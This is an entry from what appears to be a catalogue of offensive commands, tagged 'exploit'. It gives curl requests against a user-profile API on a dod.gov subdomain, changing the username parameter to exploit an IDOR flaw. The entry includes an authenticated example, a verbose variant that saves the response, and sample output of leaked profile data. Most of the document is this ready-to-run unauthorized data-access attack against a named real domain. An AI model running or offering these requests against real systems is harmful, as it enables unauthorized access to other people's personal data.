---
id: cmd-curl-idor-001
data: >-
  curl -H "Cookie: session=your_session_token"
  "https://subdomain.dod.gov/api/user/profile/{username_param}"
tags:
  - web
  - exploit
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:28.906Z'
verified: false
validated: true
submitted: true
---
# curl-idor-manipulate

## Command

```bash
curl -H "Cookie: session=your_session_token" "https://subdomain.dod.gov/api/user/profile/{username_param}"
```

## Description

This command uses curl to send an authenticated GET request to a user profile endpoint, manipulating the {username_param} to exploit IDOR and retrieve unauthorized user data like display names.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: session=..."` | Authenticates the request with session token | Yes |
| `"https://.../{username_param}"` | Target URL with manipulable username | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: session=abc123" "https://subdomain.dod.gov/api/user/profile/target@domain:port"
```

### Advanced Usage

```bash
curl -H "Cookie: session=abc123" -v "https://subdomain.dod.gov/api/user/profile/target@domain:port" > response.json
```

## Expected Output

JSON response containing user profile, e.g., {"displayname": "leakeduser", "id": 123}, indicating successful leakage if unauthorized.

## Related

- [[Related Procedure: Exploit-IDOR-for-Username-Leakage]]
